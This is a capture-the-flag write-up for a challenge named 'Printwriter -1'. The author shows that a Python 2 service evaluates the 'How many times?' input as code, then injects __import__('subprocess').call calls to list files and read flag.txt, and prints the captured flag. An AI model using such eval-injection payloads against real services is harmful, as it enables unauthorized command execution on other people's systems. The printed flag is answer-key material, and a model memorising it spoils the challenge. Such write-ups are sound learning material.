# Printwriter -1

category: misc

> I'm not very good at C, so I coded this challenge in Python. Don't have Python 3 yet though, so I used Python 2... At least it can't be pwned!

I first noticed that there is some template injection (? because like we aren't using any templates here, idk what to call it):
```
┌──(suwandi㉿ryan)-[~/ctf/blahaj]
└─$ nc 188.166.197.31 30007
Print what? rwandi
How many times? 2*2
rwandi
rwandi
rwandi
rwandi
```

So we can get shell:

```
┌──(suwandi㉿ryan)-[~/ctf/blahaj]
└─$ nc 188.166.197.31 30007
Print what? a
How many times? __import__("subprocess").call(["ls","-l"])
total 8
-rw-r--r-- 1 root root  45 Dec  2 06:54 flag.txt
-rwxr-xr-x 1 root root 267 Dec  2 06:54 run
Print what? a
How many times? __import__("subprocess").call(["cat","flag.txt"])
blahaj{0uT_w17h_th3_N3W_4Nd_1N_w1tH_the_Old}
```